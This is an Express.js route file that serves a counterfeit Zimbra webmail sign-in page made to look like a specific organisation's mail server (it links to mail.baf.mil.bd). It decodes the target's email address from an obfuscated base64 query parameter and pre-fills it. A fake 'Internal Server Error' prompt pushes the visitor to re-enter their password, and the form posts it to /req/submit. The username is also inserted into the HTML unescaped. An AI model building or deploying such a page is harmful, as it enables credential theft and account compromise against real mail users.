
const express = require ('express');
const router = express.Router();

router.use('/static', express.static('public'));
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.dhsfiourewjdfjgkfdgkldfjiorejfdjgfdgjkdfjgreioo;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  

    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
        <!DOCTYPE html>
<html class="user_font_size_normal" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="./files/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="./files/favicon.ico">
	 

<style type="text/css" id="operaUserStyle"></style></head>
<body>

	<div class="LoginScreen">
		<div class="center">
			<div class="contentBox">
				<h1><a href="" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
					<span class="ImgLoginBanner"></span>
				</a></h1>
				<div id="ZLoginAppName">Web Client</div>
				<form method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="c97bf3f0-fedb-4d42-9dfb-3e6a1d33d741">
								<div id="ZLoginErrorPanel">
									<table><tbody><tr>
										<td><img src="./files/error.png" title="Error" alt="Error" id="ZLoginErrorIcon">
			</td>
										<td> Internal Server Error: Verify that CAPS LOCK is not on, and then retype the current username and password.</td>
									</tr></tbody></table>
								</div>
								<table class="form">
                        <tbody><tr>
                                        <td><label for="username">Username:</label></td>
                                        <td><input id="username" class="zLoginField" name="username" type="text" value="${username}" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"></td>
                                        </tr>
                                        <tr>
                                <td><label for="password">Password:</label></td>
                                <td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024"></td>
                                </tr>
                                <tr>
                                <td>&nbsp;</td>
                                <td class="submitTD">
                                <input id="remember" value="1" type="checkbox" name="zrememberme">
                                    <label for="remember">Stay signed in</label>
                                <input type="submit" class="ZLoginButton DwtButton" value="Sign In">
                                </td>
                                </tr>
			
				<tr>
                            <td colspan="2"><hr></td>
                            </tr>
                            <tr>
                            <td>
                            <label for="client">Version:</label>
                            </td>
                            <td>
                            <div class="positioning">
                                <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                    <option value="preferred" selected=""> Default</option>
                                    <option value="advanced"> Advanced (Ajax)</option>
                                    <option value="standard"> Standard (HTML)</option>
                                    <option value="mobile"> Mobile</option>
                                    </select>
                                <a href="https://mail.baf.mil.bd/#" onclick="showWhatsThis();" id="ZLoginWhatsThisAnchor" aria-controls="ZLoginWhatsThis" aria-expanded="false">What’s This?</a>
                                <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick="showWhatsThis();" role="tooltip"><h3 style="text-align:center;">Client Types</h3>	<b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
                                   <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
                            </div>
                            </td>
                            </tr>
                        </tbody></table>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com/">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com/">Blog</a> - <a target="_new" href="https://wiki.zimbra.com/">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
			<div class="copyright">
			Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
		</div>
		<div class="decor2"></div>
	</div>



    </body></html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});



module.exports =router
